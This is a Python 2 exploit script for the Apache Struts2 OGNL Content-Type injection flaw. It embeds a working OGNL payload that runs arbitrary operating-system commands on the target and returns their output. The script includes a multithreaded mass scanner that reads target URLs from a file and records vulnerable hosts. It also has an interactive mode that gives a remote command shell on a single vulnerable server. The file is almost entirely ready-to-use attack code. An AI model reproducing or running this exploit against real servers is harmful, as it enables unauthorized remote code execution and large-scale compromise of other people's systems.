#coding:utf-8
import urllib2
import time
import sys
import string
import random
import threading
from Queue import Queue
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from optparse import OptionParser

URLQ = Queue()
RESULTF = open('result.txt', 'a+')
LOCK = threading.Lock()
DONE = False

def poc(url, cmd):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    retryTimes = 0
    while retryTimes < 3:
        try:
            request = urllib2.Request(url, datagen, headers=header)
            response = urllib2.urlopen(request).read()
            return response
        except:
            retryTimes += 1
            time.sleep(0.1)

    return None

def isvul(url):
    randStr = ''.join(random.sample(string.ascii_letters+string.digits, 10))
    command = "echo %s" % randStr
    text = poc(url, command)
    if text and randStr in text:
        return True
    else:
        return False

def scan():
    global RESULTF
    global URLQ
    global DONE

    while True:
        if URLQ.empty() or DONE:
            DONE = True
            break

        url = URLQ.get()
        if isvul(url):
            LOCK.acquire()
            print '[+] %s is ok' % url
            RESULTF.write(url + '\n')
            LOCK.release()

def piliang(file_name, threadNum):
    global URLQ
    global DONE

    url_fp = open(file_name, 'r')
    for url in url_fp:
        url = url.strip()
        URLQ.put(url)

    url_fp.close()

    threads = []
    for i in range(threadNum):
        t = threading.Thread(target = scan)
        threads.append(t)

    for t in threads:
        t.setDaemon(True)
        t.start()

    while not DONE:
        try:
            time.sleep(0.1)
        except KeyboardInterrupt,e:
            print '[!]User aborted, wait all slave threads to exit...'
            DONE = True

def dandian(url):
    if isvul(url):
        print "[!] You can input the command below."
        print "[!] using 'q' to exit.\n"
        while True:
            cmd = raw_input(">")
            if cmd == "q":
                sys.exit()
            elif cmd == "":
                pass
            else:
                text = poc(url, cmd)
                text = text.strip()
                print "%s\n" % text
    else:
        print "[!] %s is not vulnerable." % url

if __name__ == '__main__':
    usage = "usage: %prog [options]"
    parser = OptionParser(usage = usage)
    parser.add_option("-f", dest="filename", help="The targets file to scan.")
    parser.add_option("-u", dest="url", help="The target url to scan.")
    parser.add_option("-t", dest="threadNum", help="Set the number of threads.(default is 10)")
    (options, args) = parser.parse_args()

    if not options.filename and not options.url:
        print "[!] Please set your target using -f or -u option."
        sys.exit()

    if options.filename and options.url:
        print "[!] Please not set -f and -u options at the same time, choose the scan model you need."
        sys.exit()

    if options.filename:
        if options.threadNum:
            threadNum = int(options.threadNum)
        else:
            threadNum = 10
        piliang(options.filename, threadNum)
    elif options.url:
        dandian(options.url)

    RESULTF.close()